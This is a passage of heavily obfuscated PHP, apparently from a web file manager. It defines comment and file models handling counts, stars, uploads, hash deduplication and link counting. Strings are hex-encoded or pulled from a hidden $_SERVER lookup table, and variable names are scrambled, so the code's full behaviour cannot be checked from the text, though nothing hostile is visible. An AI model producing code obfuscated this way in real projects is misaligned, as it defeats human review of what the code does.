SourceSecretModel extends ModelBaseLight { public $optionType = "\123\171\x73\x74\x65\155\x2e\x73\157\165\x72\143\145\123\145\x63\162\145\x74\114\x69\163\164"; public $field = array("\x73\x6f\165\162\143\145\x49\104", "\x74\x79\x70\x65\111\x44", "\143\162\145\141\164\145\125\163\145\x72"); } goto dŠÒ¿‹İ‹„; EÛ¿Æ²šâ·: class CommentModel extends ModelBase { protected $tableName = "\143\157\x6d\155\145\156\164"; protected $tableMeta = array("\164\x61\x62\154\x65\x4e\141\x6d\145" => "\x63\x6f\155\155\x65\x6e\164\137\x6d\x65\164\141", "\155\x65\164\141\x46\151\145\x6c\x64" => "\143\x6f\x6d\155\x65\x6e\x74\111\x44"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($¨Óø ë½) { $—ËèöÁ‚ =& $_SERVER[ßğøİ]; if ($¨Óø ë½[$—ËèöÁ‚[1857]]) { $Ë¦¿£ÕÜ = $this->where(array($—ËèöÁ‚[1858] => $¨Óø ë½[$—ËèöÁ‚[1857]]))->find(); if (!$Ë¦¿£ÕÜ || $Ë¦¿£ÕÜ[$—ËèöÁ‚[411]] != $¨Óø ë½[$—ËèöÁ‚[411]] || $Ë¦¿£ÕÜ[$—ËèöÁ‚[505]] != $¨Óø ë½[$—ËèöÁ‚[505]]) { return !1; } $this->where(array($—ËèöÁ‚[1858] => $¨Óø ë½[$—ËèöÁ‚[1857]]))->setAdd($—ËèöÁ‚[1859], 1); } $¨Óø ë½[$—ËèöÁ‚[1860]] = 0; $¨Óø ë½[$—ËèöÁ‚[1859]] = 0; $¨Óø ë½[$—ËèöÁ‚[747]] = 1; return $this->add($¨Óø ë½); } public function commentCount($àšĞĞ–², $ŞÕÁœ¥„, $×¹«Ãí¶ = false) { $™ü®Ëµ¬ =& $_SERVER[ßğøİ]; if (!$àšĞĞ–²) { return array(); } if (is_string($àšĞĞ–²) || is_int($àšĞĞ–²)) { $àšĞĞ–² = array($àšĞĞ–²); } $ÊÀ¼öÛ™ = array($™ü®Ëµ¬[505], $™ü®Ëµ¬[1861] => $™ü®Ëµ¬[500]); $Áú³•¼ = array($™ü®Ëµ¬[505] => array($™ü®Ëµ¬[7], $àšĞĞ–²), $™ü®Ëµ¬[411] => $ŞÕÁœ¥„); if ($×¹«Ãí¶) { $Áú³•¼[$™ü®Ëµ¬[1655]] = $×¹«Ãí¶; } $÷ÛîÇ×­ = $this->field($ÊÀ¼öÛ™)->where($Áú³•¼)->group($™ü®Ëµ¬[505])->select(); return array_to_keyvalue($÷ÛîÇ×­, $™ü®Ëµ¬[505], $™ü®Ëµ¬[500]); } public function starTarget($²¼¡ŸŸö, $•§¥ò—İ) { $†áÛÌà» =& $_SERVER[ßğøİ]; $Îï¦áì = $²¼¡ŸŸö + self::TYPE_STAR_OFFSET; $íÁß÷§¡ = array($†áÛÌà»[1655] => USER_ID, $†áÛÌà»[411] => $Îï¦áì, $†áÛÌà»[505] => $•§¥ò—İ); $¨ªª›Ë… = $this->where($íÁß÷§¡)->find(); if ($¨ªª›Ë…) { return $this->where(array($†áÛÌà»[399] => $¨ªª›Ë…[$†áÛÌà»[399]]))->delete(); } $Ã…öìÍ = array($†áÛÌà»[1857] => 0, $†áÛÌà»[1655] => USER_ID, $†áÛÌà»[747] => 1, $†áÛÌà»[752] => $†áÛÌà»[12], $†áÛÌà»[411] => $Îï¦áì, $†áÛÌà»[505] => $•§¥ò—İ, $†áÛÌà»[1860] => 0, $†áÛÌà»[1859] => 0); return $this->add($Ã…öìÍ); } public function starTargetCount($àâ¨Õ€‚, $èÎÜµ¦) { $òÎî÷¿¨ =& $_SERVER[ßğøİ]; $æöşÈ¶Ë = $èÎÜµ¦ + self::TYPE_STAR_OFFSET; $ıöš’¥ù = $this->commentCount($àâ¨Õ€‚, $æöşÈ¶Ë); $ùÚ©ıà = $this->commentCount($àâ¨Õ€‚, $æöşÈ¶Ë, USER_ID); return array($òÎî÷¿¨[1862] => $ıöš’¥ù, $òÎî÷¿¨[1863] => $ùÚ©ıà); } public function starTargetUserList($®´šè“¤, $éãç­·) { $ö³´ğ¹µ =& $_SERVER[ßğøİ]; $ö¯Œ³ö» = $®´šè“¤ + self::TYPE_STAR_OFFSET; $ÂßŸ·Çµ = array($ö³´ğ¹µ[505] => $éãç­·, $ö³´ğ¹µ[411] => $ö¯Œ³ö»); $î¤×•êÎ = $this->where($ÂßŸ·Çµ)->count(); $èÍ‘Ş…÷ = array($ö³´ğ¹µ[255] => $î¤×•êÎ, $ö³´ğ¹µ[1864] => array()); if (!$î¤×•êÎ) { return $èÍ‘Ş…÷; } $İœ¬†ı = $this->field($ö³´ğ¹µ[1655])->where($ÂßŸ·Çµ)->limit(500)->select(); $İœ¬†ı = array_to_keyvalue($İœ¬†ı, $ö³´ğ¹µ[12], $ö³´ğ¹µ[1655]); $èÍ‘Ş…÷[$ö³´ğ¹µ[1864]] = Model($ö³´ğ¹µ[513])->userListInfo($İœ¬†ı); return $èÍ‘Ş…÷; } public function prasiseUserList($Ô“«Ì¨) { $„…ÈŸ³ã =& $_SERVER[ßğøİ]; $½êÁÀîé = array($„…ÈŸ³ã[1865] => $Ô“«Ì¨); $ÓèÙŞÈ½ = $this->where($½êÁÀîé)->find(); $½ÒÆÚ˜ë = _get($ÓèÙŞÈ½, $„…ÈŸ³ã[1860], 0); $Ô¾ÖË³Ú = array($„…ÈŸ³ã[255] => $½ÒÆÚ˜ë, $„…ÈŸ³ã[1864] => array()); if (!$½ÒÆÚ˜ë) { return $Ô¾ÖË³Ú; } $Û¸èÈÅ™ = Model($„…ÈŸ³ã[1866])->field($„…ÈŸ³ã[1655])->where($½êÁÀîé)->limit(500)->select(); $Û¸èÈÅ™ = array_to_keyvalue($Û¸èÈÅ™, $„…ÈŸ³ã[12], $„…ÈŸ³ã[1655]); $Ô¾ÖË³Ú[$„…ÈŸ³ã[1864]] = Model($„…ÈŸ³ã[513])->userListInfo($Û¸èÈÅ™); return $Ô¾ÖË³Ú; } public function remove($›¬’ü€) { $Ìßõ±°â =& $_SERVER[ßğøİ]; $×Á»¶–ğ = array($Ìßõ±°â[1858] => $›¬’ü€); $¢Úå­øŒ = $this->where($×Á»¶–ğ)->find(); if ($¢Úå­øŒ[$Ìßõ±°â[1857]]) { $this->where(array($Ìßõ±°â[1858] => $¢Úå­øŒ[$Ìßõ±°â[1857]]))->setAdd($Ìßõ±°â[1859], -1); } return $this->where($×Á»¶–ğ)->delete(); } public function edit($ÜÌ¨âı§, $ÛÜ¿÷) { $†£ÈÜìÔ =& $_SERVER[ßğøİ]; $Üœ€âÑö = array($†£ÈÜìÔ[1858] => $ÜÌ¨âı§); return $this->where($Üœ€âÑö)->save(array($†£ÈÜìÔ[1867] => $ÛÜ¿÷)); } public function prasise($Àêšè™”) { $Æ’±ä¼ =& $_SERVER[ßğøİ]; $Ü®ò´ƒ = Model($Æ’±ä¼[1868]); $ªàòê³Š = array($Æ’±ä¼[1858] => $Àêšè™”, $Æ’±ä¼[1646] => USER_ID); $×¦Â„÷ô = $Ü®ò´ƒ->where($ªàòê³Š)->find(); if (!$×¦Â„÷ô) { $Ü®ò´ƒ->add($ªàòê³Š); $‚İÜŞ  = $this->where(array($Æ’±ä¼[1858] => $Àêšè™”))->setAdd($Æ’±ä¼[1860], 1); } else { $Ü®ò´ƒ->where($ªàòê³Š)->delete(); $‚İÜŞ  = $this->where(array($Æ’±ä¼[1858] => $Àêšè™”))->setAdd($Æ’±ä¼[1860], -1); } return $‚İÜŞ ; } public function targetInfo($½¨åéƒä, $Üˆˆ¤è) { $òêı“ŠÁ =& $_SERVER[ßğøİ]; $³¤‰şé¢ = array($òêı“ŠÁ[586] => $½¨åéƒä, $òêı“ŠÁ[587] => $Üˆˆ¤è); $˜Áß¯æ“ = $this->where($³¤‰şé¢)->count(); $‘‹¼Ÿ = "\122\111\x47\110\x54\40\112\x4f\x49\x4e\40{$this->tablePrefix}\x63\157\x6d\155\145\156\164\137\x70\x72\141\x69\x73\x65\x20\163\164\141\162\x20\x6f\156\x20\x63\157\x6d\x6d\x65\x6e\x74\56\x63\x6f\155\155\x65\x6e\164\111\104\x20\75\40\163\164\141\162\x2e\x63\157\x6d\x6d\x65\x6e\x74\111\x44"; $ŸÅ›ÂÏ¿ = $this->alias($òêı“ŠÁ[354])->where($³¤‰şé¢)->join($‘‹¼Ÿ, $òêı“ŠÁ[1869])->count(); $©ÚˆÔü = array($òêı“ŠÁ[1870] => $˜Áß¯æ“, $òêı“ŠÁ[1871] => $ŸÅ›ÂÏ¿); return $©ÚˆÔü; } public function listData($­ µ™‰§) { $·ÜÎãå =& $_SERVER[ßğøİ]; if (isset($­ µ™‰§[$·ÜÎãå[1872]])) { if ($­ µ™‰§[$·ÜÎãå[1872]]) { $­ µ™‰§[$·ÜÎãå[1865]] = array($·ÜÎãå[1014], intval($­ µ™‰§[$·ÜÎãå[1872]])); } unset($­ µ™‰§[$·ÜÎãå[1872]]); } if (isset($­ µ™‰§[$·ÜÎãå[1873]])) { if ($­ µ™‰§[$·ÜÎãå[1873]]) { $­ µ™‰§[$·ÜÎãå[1865]] = array($·ÜÎãå[1011], intval($­ µ™‰§[$·ÜÎãå[1873]])); } unset($­ µ™‰§[$·ÜÎãå[1873]]); } return $this->_listData($­ µ™‰§); } private function _listData($ÂÜÅæÖ) { $ì»¾±åÒ =& $_SERVER[ßğøİ]; $±ôï¯¸ = $this->where($ÂÜÅæÖ)->_makeOrder()->selectPage(100); $this->_listAppendParent($±ôï¯¸[$ì»¾±åÒ[369]]); $this->_listAppendUser($±ôï¯¸[$ì»¾±åÒ[369]]); $this->_listAppendMeta($±ôï¯¸[$ì»¾±åÒ[369]]); return $±ôï¯¸; } private function _makeOrder() { $¨Üè™ğ¢ =& $_SERVER[ßğøİ]; $‚è„Ø¡® = array($¨Üè™ğ¢[1860], $¨Üè™ğ¢[1859], $¨Üè™ğ¢[200]); $˜ê¢áÁ’ = Input::get($¨Üè™ğ¢[457], $¨Üè™ğ¢[7], $¨Üè™ğ¢[423], $‚è„Ø¡®); $èêøüÑ = Input::get($¨Üè™ğ¢[458], $¨Üè™ğ¢[7], $¨Üè™ğ¢[1648], array($¨Üè™ğ¢[1874], $¨Üè™ğ¢[453])); $°óÚ°ª = $˜ê¢áÁ’ . $¨Üè™ğ¢[53] . $èêøüÑ; return $this->order($°óÚ°ª); } private function _listAppendParent(&$úîáÜ¶š) { $ò§µ ¹« =& $_SERVER[ßğøİ]; $¤œ ˆğæ = array_unique(array_to_keyvalue($úîáÜ¶š, $ò§µ ¹«[12], $ò§µ ¹«[1857])); $¤œ ˆğæ = array_remove_value($¤œ ˆğæ, $ò§µ ¹«[197]); if (!$¤œ ˆğæ) { return; } $‰ğË‹üÛ = $this->where(array($ò§µ ¹«[1858] => array($ò§µ ¹«[7], $¤œ ˆğæ)))->select(); $‰ğË‹üÛ = array_to_keyvalue($‰ğË‹üÛ, $ò§µ ¹«[1865]); foreach ($úîáÜ¶š as &$ö„«òö) { if (isset($‰ğË‹üÛ[$ö„«òö[$ò§µ ¹«[1857]]])) { $ö„«òö[$ò§µ ¹«[1875]] = $‰ğË‹üÛ[$ö„«òö[$ò§µ ¹«[1857]]]; } } unset($ö„«òö); } private function _listAppendUser(&$Ï€¹‘‚í) { $À‚õÜõÇ =& $_SERVER[ßğøİ]; $´œ¿šûø = array_unique(array_to_keyvalue($Ï€¹‘‚í, $À‚õÜõÇ[12], $À‚õÜõÇ[1655])); $´œ¿šûø = array_remove_value($´œ¿šûø, $À‚õÜõÇ[197]); if (count($´œ¿šûø) == 0) { return; } foreach ($Ï€¹‘‚í as $ƒª®ØÆ‰) { if (isset($ƒª®ØÆ‰[$À‚õÜõÇ[1875]])) { $´œ¿šûø[] = $ƒª®ØÆ‰[$À‚õÜõÇ[1875]][$À‚õÜõÇ[1655]]; } } $¦ıÈ„ƒ¡ = Model($À‚õÜõÇ[535])->userListInfo($´œ¿šûø); foreach ($Ï€¹‘‚í as &$ƒª®ØÆ‰) { $ƒª®ØÆ‰[$À‚õÜõÇ[600]] = $¦ıÈ„ƒ¡[$ƒª®ØÆ‰[$À‚õÜõÇ[1655]]]; if (isset($ƒª®ØÆ‰[$À‚õÜõÇ[1875]])) { $ƒª®ØÆ‰[$À‚õÜõÇ[1875]][$À‚õÜõÇ[600]] = $¦ıÈ„ƒ¡[$ƒª®ØÆ‰[$À‚õÜõÇ[1875]][$À‚õÜõÇ[1655]]]; } } unset($ƒª®ØÆ‰); } private function _listAppendMeta(&$²Í¶ò÷Š) { $ ¡“ß–Ò =& $_SERVER[ßğøİ]; $šèçÍØ = array_unique(array_to_keyvalue($²Í¶ò÷Š, $ ¡“ß–Ò[12], $ ¡“ß–Ò[1865])); $šèçÍØ = array_remove_value($šèçÍØ, $ ¡“ß–Ò[197]); if (!$šèçÍØ) { return; } foreach ($²Í¶ò÷Š as $¬Á½ÇÚ°) { if (isset($¬Á½ÇÚ°[$ ¡“ß–Ò[1875]])) { $šèçÍØ[] = $¬Á½ÇÚ°[$ ¡“ß–Ò[1875]][$ ¡“ß–Ò[1865]]; } } $åóË¹òÂ = $this->metaList($šèçÍØ); if (!$åóË¹òÂ) { return !1; } foreach ($²Í¶ò÷Š as &$¬Á½ÇÚ°) { $¬Á½ÇÚ°[$ ¡“ß–Ò[466]] = $åóË¹òÂ[$¬Á½ÇÚ°[$ ¡“ß–Ò[1865]]]; if (isset($¬Á½ÇÚ°[$ ¡“ß–Ò[1875]])) { $¬Á½ÇÚ°[$ ¡“ß–Ò[1875]][$ ¡“ß–Ò[466]] = $åóË¹òÂ[$¬Á½ÇÚ°[$ ¡“ß–Ò[1875]][$ ¡“ß–Ò[1865]]]; } } unset($¬Á½ÇÚ°); } private function metaList($ó´°î’) { $¥ÅÍá‚ =& $_SERVER[ßğøİ]; if (!$ó´°î’) { return array(); } $şúêöìî = array($¥ÅÍá‚[1865] => array($¥ÅÍá‚[7], $ó´°î’)); $˜•æó²Ğ = Model($¥ÅÍá‚[1876])->where($şúêöìî)->select(); $˜•æó²Ğ = array_to_keyvalue_group($˜•æó²Ğ, $¥ÅÍá‚[1865]); foreach ($˜•æó²Ğ as $ù£ø‰ => $¹ÌŞÃä„) { $òæĞ°Ä¨ = array(); foreach ($¹ÌŞÃä„ as $æÁÅ½‰æ) { $òæĞ°Ä¨[$æÁÅ½‰æ[$¥ÅÍá‚[94]]] = $æÁÅ½‰æ[$¥ÅÍá‚[374]]; } $˜•æó²Ğ[$ù£ø‰] = $òæĞ°Ä¨; } return $˜•æó²Ğ ? $˜•æó²Ğ : array(); } } class FileContentModel extends ModelBase { protected $tableName = "\151\157\x5f\146\151\x6c\145\137\143\157\156\164\145\x6e\164\163"; protected $dataAuto = array(array("\143\x72\145\141\x74\x65\x54\151\x6d\x65", "\164\151\x6d\145", "\x69\x6e\x73\145\162\x74", "\x66\x75\156\x63\164\151\x6f\156")); } class FileModel extends ModelBase { protected $tableName = "\x69\x6f\137\x66\151\x6c\x65"; protected $tableMeta = array("\x74\x61\x62\154\145\x4e\141\x6d\145" => "\x69\157\137\x66\151\154\145\137\155\145\x74\x61", "\x6d\145\x74\141\106\x69\145\x6c\144" => "\146\151\x6c\x65\x49\104"); public function fileInfo($å™…ÈÂØ) { $Ï¶Ò™£ú =& $_SERVER[ßğøİ]; static $³å†‡Åœ = array(); if (!isset($³å†‡Åœ[$å™…ÈÂØ])) { $ª—æÇÃ÷ = $Ï¶Ò™£ú[1877]; $‹À·‘éë = Model($Ï¶Ò™£ú[471])->field($ª—æÇÃ÷)->where(array($Ï¶Ò™£ú[469] => $å™…ÈÂØ))->find(); $³å†‡Åœ[$å™…ÈÂØ] = $‹À·‘éë; } return $³å†‡Åœ[$å™…ÈÂØ]; } public function addFileByContent($ñ¢³ûü = '', $ĞÎ”÷ = '') { $ì¸Ä¼ÄÀ =& $_SERVER[ßğøİ]; $Ø‰Úñè = TEMP_PATH . $ì¸Ä¼ÄÀ[1878]; if (!is_dir($Ø‰Úñè)) { mk_dir($Ø‰Úñè); } $…ŞÈÒ« = $Ø‰Úñè . $ì¸Ä¼ÄÀ[1879] . rand_string(16); file_put_contents($…ŞÈÒ«, $ñ¢³ûü); $Ÿì•¸° = $this->addFile($…ŞÈÒ«, $ĞÎ”÷, !0); if (file_exists($…ŞÈÒ«)) { @unlink($…ŞÈÒ«); } return $Ÿì•¸°; } public function createFileName($Ñ‘ú°‹», $˜—îÄœö = false, $€øöÍ—Ü = false) { $´Ñ“”óœ =& $_SERVER[ßğøİ]; $´ï©Í¦ = IO::init($´Ñ“”óœ[8]); $âµ†úÌƒ = $this->makeFilePath($Ñ‘ú°‹», $´ï©Í¦, $˜—îÄœö, $€øöÍ—Ü); $ò„Şéâß = $´ï©Í¦->pathFather($âµ†úÌƒ); static $æà£“«Ú = false; $ŸÀêø¾” = $´Ñ“”óœ[1880] . md5($ò„Şéâß); if (!$æà£“«Ú && !Cache::get($ŸÀêø¾”)) { $æà£“«Ú = !0; $‘¨½™×À = IO::mkdir($ò„Şéâß); if (!IO::exist($‘¨½™×À . $´Ñ“”óœ[794])) { IO::mkfile($‘¨½™×À . $´Ñ“”óœ[794]); } Cache::set($ŸÀêø¾”, 1, 3600 * 2); } return $âµ†úÌƒ; } public function makeFilePath($Ö¯¢‚ú¾, $°Îâ¶î¥, $¼É×»ÙÒ = false, $Ö¹÷©ˆ = false) { $ôçÑÉàõ =& $_SERVER[ßğøİ]; $Ò˜¨í = Model($ôçÑÉàõ[767])->get($ôçÑÉàõ[1881]); $¶®ûß˜ô = KodIO::defaultIO() . date($ôçÑÉàõ[1882]); $§ãÇêë = $¶®ûß˜ô . rand_string(5) . short_id(100); $Ö¯¢‚ú¾ = str_replace($ôçÑÉàõ[8], $ôçÑÉàõ[11], KodIO::clear($Ö¯¢‚ú¾)); $†£°Ã‹¾ = $°Îâ¶î¥->ext($Ö¯¢‚ú¾); if (!$Ö¯¢‚ú¾) { $Ò˜¨í = $ôçÑÉàõ[1883]; } switch ($Ò˜¨í) { case $ôçÑÉàõ[1884]: $§ãÇêë = $§ãÇêë . $ôçÑÉàõ[10] . $°Îâ¶î¥->ext($Ö¯¢‚ú¾); if ($†£°Ã‹¾ == $ôçÑÉàõ[1821]) { $§ãÇêë .= $ôçÑÉàõ[1550]; } break; case $ôçÑÉàõ[1885]: $¾­µÃÚ„ = Model($ôçÑÉàõ[767])->get($ôçÑÉàõ[768]); $¢›˜¨ = substr(md5($ôçÑÉàõ[769] . $¾­µÃÚ„ . date($ôçÑÉàõ[745])), 0, 8); $ÓƒÀàõ = KodIO::defaultDriver(); $¶®ûß˜ô = $ôçÑÉàõ[1229] . $ÓƒÀàõ[$ôçÑÉàõ[399]] . $ôçÑÉàõ[409] . date($ôçÑÉàõ[1886]) . $¢›˜¨ . $ôçÑÉàõ[8]; if ($†£°Ã‹¾ == $ôçÑÉàõ[1821]) { $Ö¯¢‚ú¾ .= $ôçÑÉàõ[1550]; } $…åÂÂîª = $ôçÑÉàõ[1887] . $¶®ûß˜ô . $Ö¯¢‚ú¾; CacheLock::lock($…åÂÂîª); $§ãÇêë = $¶®ûß˜ô . $Ö¯¢‚ú¾; if (IO::exist($¶®ûß˜ô . $Ö¯¢‚ú¾)) { $§ñÏø†‘ = substr($Ö¯¢‚ú¾, 0, strlen($Ö¯¢‚ú¾) - strlen($†£°Ã‹¾)); $â›Û¦æë = $Ö¹÷©ˆ ? substr($Ö¹÷©ˆ, 0, 5) : ($¼É×»ÙÒ ? substr($¼É×»ÙÒ, 0, 5) : rand_string(5)); $§ãÇêë = $¶®ûß˜ô . $§ñÏø†‘ . $â›Û¦æë . $ôçÑÉàõ[10] . $†£°Ã‹¾; } if (IO::isTypeObject($§ãÇêë) && !IO::isUploadServer($§ãÇêë)) { if (IO::exist($§ãÇêë)) { return $§ãÇêë; } $“Úƒ·ƒ = IO::setContent($§ãÇêë, $ôçÑÉàõ[12]); if (!$“Úƒ·ƒ) { show_json($ôçÑÉàõ[1888], !1); } } CacheLock::unlock($…åÂÂîª); break; case $ôçÑÉàõ[1883]: break; default: break; } return $§ãÇêë; } public function addFileByRemote($»›‚™ìˆ, $Ã«¶µã¦, $½ğ™Êôí = array()) { $ŞÊâÖ¶Ø =& $_SERVER[ßğøİ]; if (!IO::exist($»›‚™ìˆ)) { return !1; } $Ã¸Î î¬ = $½ğ™Êôí[$ŞÊâÖ¶Ø[176]] ? $½ğ™Êôí[$ŞÊâÖ¶Ø[176]] : $ŞÊâÖ¶Ø[12]; $²ü´‚— = IO::hashMd5($»›‚™ìˆ, $Ã¸Î î¬); $ëÛÃ°¾¼ = KodIO::defaultDriver(); $›ï†«áĞ = array($ŞÊâÖ¶Ø[585] => IO::size($»›‚™ìˆ), $ŞÊâÖ¶Ø[1889] => 1, $ŞÊâÖ¶Ø[420] => $Ã«¶µã¦, $ŞÊâÖ¶Ø[805] => $ëÛÃ°¾¼[$ŞÊâÖ¶Ø[399]], $ŞÊâÖ¶Ø[421] => $»›‚™ìˆ, $ŞÊâÖ¶Ø[1890] => $½ğ™Êôí[$ŞÊâÖ¶Ø[177]] ? $½ğ™Êôí[$ŞÊâÖ¶Ø[177]] : IO::hashSimple($»›‚™ìˆ), $ŞÊâÖ¶Ø[1891] => $²ü´‚— ? $²ü´‚— : $Ã¸Î î¬); if ($…ù¾õ ‡ = $this->addFileCheckExist($›ï†«áĞ[$ŞÊâÖ¶Ø[177]], $›ï†«áĞ[$ŞÊâÖ¶Ø[176]], $›ï†«áĞ[$ŞÊâÖ¶Ø[76]])) { return $…ù¾õ ‡; } return $this->addFileData($›ï†«áĞ); } private function addFileData($é»Ó´Ô) { $È­Ÿè” =& $_SERVER[ßğøİ]; if (!$é»Ó´Ô) { return !1; } $é»Ó´Ô[$È­Ÿè”[76]] = intval($é»Ó´Ô[$È­Ÿè”[76]]); if (!$é»Ó´Ô[$È­Ÿè”[76]] && strlen($é»Ó´Ô[$È­Ÿè”[177]]) > 32) { $é»Ó´Ô[$È­Ÿè”[76]] = intval(substr($é»Ó´Ô[$È­Ÿè”[177]], 32)); } $®¡£½¢“ = $this->add($é»Ó´Ô); return $this->find($®¡£½¢“); } public function addFile($Ì‹ØøÒÎ, $§‡Èâ“¥, $Ç´ ¾½Ø = false) { $…ØÌ†İÄ =& $_SERVER[ßğøİ]; $´à¦‡ƒ = IO::hashSimple($Ì‹ØøÒÎ); $Œ´ŒèŠ = IO::size($Ì‹ØøÒÎ); $ÔâÚ¢ç´ = $Œ´ŒèŠ <= 1024 * 1024 * 10 ? IO::hashMd5($Ì‹ØøÒÎ) : $…ØÌ†İÄ[12]; $—Ö’·Ğæ = $…ØÌ†İÄ[1892] . $´à¦‡ƒ; CacheLock::lock($—Ö’·Ğæ); if ($ÔâÚ¢ç´ && $´à¦‡ƒ) { $Á‹¬¥Ê• = $this->addFileCheckExist($´à¦‡ƒ, $ÔâÚ¢ç´, $Œ´ŒèŠ); if ($Á‹¬¥Ê•) { CacheLock::unlock($—Ö’·Ğæ); return $Á‹¬¥Ê•; } } $±‘øÄø = $this->addFileMake($Ì‹ØøÒÎ, $Œ´ŒèŠ, $´à¦‡ƒ, $ÔâÚ¢ç´, $§‡Èâ“¥, $Ç´ ¾½Ø); $—§£Å´Ü = $this->addFileData($±‘øÄø); CacheLock::unlock($—Ö’·Ğæ); if (!$ÔâÚ¢ç´ && $—§£Å´Ü) { $this->fileMd5Check($—§£Å´Ü); } return $—§£Å´Ü; } private function fileMd5Check($ğĞŞÖˆ) { $è¢Ğ×¯ì =& $_SERVER[ßğøİ]; $ß¡±“®³ = array($ğĞŞÖˆ[$è¢Ğ×¯ì[468]], $ğĞŞÖˆ[$è¢Ğ×¯ì[84]]); $‘äËº°ı = $è¢Ğ×¯ì[1893] . $ğĞŞÖˆ[$è¢Ğ×¯ì[84]]; $¨ï¦ÃĞı = $è¢Ğ×¯ì[1894] . $ğĞŞÖˆ[$è¢Ğ×¯ì[468]]; $–’Îíï = TaskQueue::add($è¢Ğ×¯ì[1895], $ß¡±“®³, $‘äËº°ı, $¨ï¦ÃĞı); if (!$–’Îíï) { $this->fileMd5Set($ğĞŞÖˆ[$è¢Ğ×¯ì[468]], $ğĞŞÖˆ[$è¢Ğ×¯ì[84]]); } else { TaskQueue::addSubmit(); } } public function fileMd5Set($¼¡˜‰Úô, $Ğ©…¦¡) { $ÓæİÖÏ÷ =& $_SERVER[ßğøİ]; $•Ã’ó“­ = $this->find($¼¡˜‰Úô); if (!$•Ã’ó“­ || $•Ã’ó“­[$ÓæİÖÏ÷[176]]) { return; } $Õ ü¼å¬ = IO::hashMd5($Ğ©…¦¡); if (!$Õ ü¼å¬) { return $ÓæİÖÏ÷[12]; } $this->where(array($ÓæİÖÏ÷[468] => $¼¡˜‰Úô))->save(array($ÓæİÖÏ÷[176] => $Õ ü¼å¬)); } public function addFileMake($—‘ÚÇÌÌ, $û¨±œ£‚, $İ™ÛŒ„Ú, $™ê±ËÂ, $ƒˆÔ–, $Ìõ§ßí) { $Û®“İŠ =& $_SERVER[ßğøİ]; $¦ûé²Ê— = $this->createFileName($ƒˆÔ–, $İ™ÛŒ„Ú, $™ê±ËÂ); $äÏ‚Ú é = get_path_father($¦ûé²Ê—); $§åÄú¶ˆ = get_path_this($¦ûé²Ê—); if ($Ìõ§ßí) { $ı¿Ù ¤ = IO::move($—‘ÚÇÌÌ, $äÏ‚Ú é, !1, $§åÄú¶ˆ); } else { $ı¿Ù ¤ = IO::copy($—‘ÚÇÌÌ, $äÏ‚Ú é, !1, $§åÄú¶ˆ); } if (!$ı¿Ù ¤) { return !1; } $‰¸„Ö”ù = KodIO::defaultDriver(); $ğëËÉÑØ = array($Û®“İŠ[585] => $û¨±œ£‚, $Û®“İŠ[1889] => 1, $Û®“İŠ[420] => $ƒˆÔ–, $Û®“İŠ[805] => $‰¸„Ö”ù[$Û®“İŠ[399]], $Û®“İŠ[421] => $¦ûé²Ê—, $Û®“İŠ[1890] => $İ™ÛŒ„Ú, $Û®“İŠ[1891] => $™ê±ËÂ); return $ğëËÉÑØ; } public function addFileCheckExist($¸ãŸÈƒÊ, $Ë¡§’ß, $ÙÕŸ­¿Ò) { $ÛŸé¨Œ =& $_SERVER[ßğøİ]; $½Û½šÉ = $this->findByHash($¸ãŸÈƒÊ, $Ë¡§’ß); if (!$½Û½šÉ) { return !1; } $ÔîØÅ£’ = array($ÛŸé¨Œ[1889] => intval($½Û½šÉ[$ÛŸé¨Œ[1896]]) + 1, $ÛŸé¨Œ[585] => $ÙÕŸ­¿Ò); $this->where(array($ÛŸé¨Œ[469] => $½Û½šÉ[$ÛŸé¨Œ[468]]))->save($ÔîØÅ£’); return $½Û½šÉ; } public function remove($¨ÆÍ©²Æ) { $this->linkCountChange($¨ÆÍ©²Æ, !1); $this->clearEmpty(); return !0; } public function linkAdd($íÇ¼ÃÕä) { $this->linkCountChange($íÇ¼ÃÕä, !0); } public function linkCountChange($ú©Ûà‚, $ı‡Ïìí) { $®ÖİÜ‡ä =& $_SERVER[ßğøİ]; if (!$ú©Ûà‚) { return; } if (!is_array($ú©Ûà‚)) { $ú©Ûà‚ = array($ú©Ûà‚); } $ŞšÅ·¼Æ = array(); foreach ($ú©Ûà‚ as $ºÇ ëª) { $Ô¡”«¬¡ = $ºÇ ëª . $®ÖİÜ‡ä[12]; if (!$ŞšÅ·¼Æ[$Ô¡”«¬¡]) { $ŞšÅ·¼Æ[$Ô¡”«¬¡] = 0; } $ŞšÅ·¼Æ[$Ô¡”«¬¡]++; } $éñ‰¾´Ò = array(); foreach ($ŞšÅ·¼Æ as $ºÇ ëª => $°ãÃ€) { $Ô¡”«¬¡ = $°ãÃ€ . $®ÖİÜ‡ä[12]; if (!$éñ‰¾´Ò[$Ô¡”«¬¡]) { $éñ‰¾´Ò[$Ô¡”«¬¡] = array(); } $éñ‰¾´Ò[$Ô¡”«¬¡][] = $ºÇ ëª; } foreach ($éñ‰¾´Ò as $°ãÃ€ => $ËÇß¥ê¼) { if (!$ËÇß¥ê¼) { continue; } $°ãÃ€ = $ı‡Ïìí ? $°ãÃ€ : -intval($°ãÃ€); $ş³ç‚© = array($®ÖİÜ‡ä[468] => array($®ÖİÜ‡ä[7], $ËÇß¥ê¼)); if ($°ãÃ€ < 0) { $ş³ç‚©[$®ÖİÜ‡ä[1896]] = array($®ÖİÜ‡ä[1015], abs($°ãÃ€)); } $this->where($ş³ç‚©)->setAdd($®ÖİÜ‡ä[1896], $°ãÃ€); } } public function findByHash($Å•œúÓ, $ı¬¿Ä¿ª = false) { $¤ÔÄ÷· =& $_SERVER[ßğøİ]; if (!$Å•œúÓ && !$ı¬¿Ä¿ª) { return !1; } $öÀğ”¾Ş = array($¤ÔÄ÷·[1890] => $Å•œúÓ); if ($ı¬¿Ä¿ª) { $öÀğ”¾Ş = array($¤ÔÄ÷·[1891] => $ı¬¿Ä¿ª); } return $this->order($¤ÔÄ÷·[1897])->where($öÀğ”¾Ş)->find(); } public function clearEmpty($“­´«À“ = 0) { $¾Ş ÇÍ‰ =& $_SERVER[ßğøİ]; $Â¶ç•á = time() - 3600 * 24 * $“­´«À“; $³¸Ç¬˜® = $¾Ş ÇÍ‰[1898] . $Â¶ç•á; $ãè˜´¬Ğ = $this->where($³¸Ç¬˜®)->select(); if (!$ãè˜´¬Ğ) { return; } $¯Ìğò€Ì = new Task($¾Ş ÇÍ‰[1899], 